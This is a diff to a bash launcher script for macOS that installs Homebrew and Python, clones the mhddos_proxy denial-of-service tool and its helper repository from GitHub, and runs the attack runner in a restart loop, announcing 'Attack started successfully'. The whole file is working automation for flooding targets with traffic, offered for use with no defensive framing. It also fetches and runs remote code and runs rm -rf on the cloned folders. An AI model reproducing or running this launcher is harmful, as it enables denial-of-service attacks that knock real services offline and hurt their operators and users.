@@ -3,18 +3,18 @@
 set -e 
 
 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-brew install coreutils
-brew install git
-brew install python@3.10
-python3 -m pip install --upgrade setuptools
+brew install coreutils git python@3.10
+python3.10 -m pip install --upgrade setuptools
 
 cd ~
+rm -rf auto_mhddos_mac || true
 git clone https://github.com/alexnest-ua/auto_mhddos_mac || true 
+rm -rf mhddos_proxy || true
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy || true 
 cd ~/mhddos_proxy
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sleep 2
-python3 -m pip install -r requirements.txt
+python3.10 -m pip install -r requirements.txt
 
 restart_interval="1200"
 
@@ -81,7 +81,7 @@ do
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
 	else
 		cd ~/mhddos_proxy
-		python3 -m pip install -r requirements.txt
+		python3.10 -m pip install -r requirements.txt
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
 		sleep 3
@@ -118,7 +118,7 @@ do
     	echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
     	cd ~/mhddos_proxy
-    	python3 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
+    	python3.10 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
 	PID="$!"
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 
